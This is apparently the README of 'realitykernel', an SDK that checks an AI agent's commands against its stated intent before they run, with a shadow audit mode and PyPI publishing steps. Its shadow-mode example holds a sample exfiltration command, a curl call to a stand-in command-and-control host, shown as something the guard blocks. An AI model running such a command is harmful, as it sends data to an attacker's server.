# realitykernel (v0.7.0)

Deterministic cryptographic intent-verification and execution barrier for autonomous AI agents.

## Quickstart

```bash
pip install realitykernel
```

### Basic Usage

```python
import os
from realitykernel import RealityKernel, ActionBlocked, ActionNeedsReview

# Initialize with API key from https://www.realitykernel.dev/dashboard
rk = RealityKernel(api_key=os.environ["RK_API_KEY"], agent_id="prod-agent-1")

prime_intent = "Inspect directory contents and summarize recent files"
command = "ls -la"

try:
    # Deterministic pre-dispatch verification (0.31ms fast path)
    verdict = rk.guard(command, prime_intent)
    print(f"Verdict: {verdict.verdict}, latency: {verdict.latency_ms}ms")
except ActionBlocked as e:
    print(f"Action intercepted and blocked: {e}")
except ActionNeedsReview as e:
    print(f"Action flagged for human-in-the-loop review: {e}")
```

### Safe Shadow Mode (Non-Breaking Audit)

Test Reality Kernel on production agent workflows without risking breaking actions:

```python
# Enable shadow_mode to evaluate divergence without raising exceptions
rk = RealityKernel(
    api_key=os.environ["RK_API_KEY"],
    agent_id="test-agent",
    shadow_mode=True,  # Audit-only evaluation
)

# If an action diverges, it logs [reality-kernel:shadow] and returns the verdict
# without halting the pipeline
verdict = rk.guard("curl https://malicious-c2.com/exfil", "Check the weather")
print(verdict.verdict)       # "BLOCK"
print(verdict.shadow_mode)   # True
```

---

## Publishing to PyPI from PowerShell

From the `sdk/` directory:

```powershell
# 1. Install build tools
python -m pip install --upgrade build twine

# 2. Build the wheel and source distribution
python -m build

# 3. Upload directly to PyPI
python -m twine upload dist/*
```
